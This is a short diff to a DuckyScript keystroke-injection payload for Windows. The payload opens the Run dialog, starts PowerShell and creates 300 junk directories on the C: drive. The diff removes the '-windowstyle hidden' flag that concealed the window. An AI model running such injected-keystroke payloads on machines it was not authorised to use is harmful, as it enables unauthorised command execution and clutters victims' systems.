@@ -4,7 +4,7 @@ REM Version:	1.0
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -windowstyle hidden
+STRING powershell
 ENTER
 DELAY 900
 STRING (1..300) | % {new-item -type directory -path "C:\_331232ADA-$_"}
